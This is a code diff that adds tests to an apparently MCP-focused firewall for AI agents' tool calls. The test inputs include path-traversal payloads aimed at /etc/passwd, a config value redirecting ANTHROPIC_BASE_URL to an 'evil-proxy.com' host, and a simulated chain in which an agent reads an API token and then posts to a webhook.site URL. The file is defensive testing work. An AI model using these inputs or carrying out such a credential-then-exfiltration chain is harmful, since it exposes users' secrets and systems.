@@ -308,6 +308,62 @@ console.log('\n--- MCPGuard Rugpull Detection ---');
   assert(result.threats[0].type === 'tool_definition_change', 'Rugpull alert type correct');
 })();
 
+// --- Path Traversal Firewall ---
+console.log('\n--- MCPGuard Path Traversal Firewall ---');
+
+(() => {
+  const guard = new MCPGuard();
+  guard.registerServer('pt-srv', [{ name: 'readFile' }]);
+
+  const traversal = guard.interceptToolCall('pt-srv', 'readFile', { path: '../../../../etc/passwd' });
+  assert(traversal.allowed === false, 'Path traversal blocked');
+  assert(traversal.threats.some(t => t.type === 'path_traversal_blocked'), 'Path traversal threat type present');
+
+  const encoded = guard.interceptToolCall('pt-srv', 'readFile', { path: '%2e%2e%2f%2e%2e%2fetc%2fpasswd' });
+  assert(encoded.allowed === false, 'URL-encoded path traversal blocked');
+
+  const guard2 = new MCPGuard();
+  guard2.registerServer('pt-safe', [{ name: 'readFile' }]);
+  const normal = guard2.interceptToolCall('pt-safe', 'readFile', { path: '/home/user/docs/report.pdf' });
+  assert(normal.allowed === true, 'Normal file path allowed');
+})();
+
+// --- Config Poisoning Firewall ---
+console.log('\n--- MCPGuard Config Poisoning Firewall ---');
+
+(() => {
+  const guard = new MCPGuard();
+  guard.registerServer('cfg-srv', [{ name: 'setConfig' }]);
+
+  const urlOverride = guard.interceptToolCall('cfg-srv', 'setConfig', 'ANTHROPIC_BASE_URL=https://evil-proxy.com');
+  assert(urlOverride.allowed === false, 'API URL override blocked');
+  assert(urlOverride.threats.some(t => t.type === 'config_poisoning_blocked'), 'Config poisoning threat type present');
+
+  const legitimate = guard.interceptToolCall('cfg-srv', 'setConfig', 'ANTHROPIC_BASE_URL=https://api.anthropic.com');
+  assert(legitimate.allowed === true, 'Official API URL allowed');
+})();
+
+// --- Cross-Agent Chain Detection ---
+console.log('\n--- MCPGuard Cross-Agent Chain Detection ---');
+
+(() => {
+  const guard = new MCPGuard();
+  guard.registerServer('srv-a', [{ name: 'getSecrets' }]);
+  guard.registerServer('srv-b', [{ name: 'httpPost' }]);
+
+  // Simulate credential read then outbound call across servers
+  guard.interceptToolCall('srv-a', 'getSecrets', { key: 'api_token' });
+  // Ensure timestamps differ
+  const entry = guard._chainTracker[guard._chainTracker.length - 1];
+  if (entry) entry.timestamp -= 1000;
+  guard.interceptToolCall('srv-b', 'httpPost', { url: 'https://webhook.site/collect' });
+
+  const chains = guard.detectAttackChains();
+  assert(chains.chains.length > 0, 'Cross-agent attack chain detected');
+  assert(chains.chains[0].type === 'credential_then_exfil', 'Chain type is credential_then_exfil');
+  assert(chains.riskLevel === 'critical', 'Risk level is critical');
+})();
+
 // --- SSRF Firewall ---
 console.log('\n--- MCPGuard SSRF Firewall ---');
 
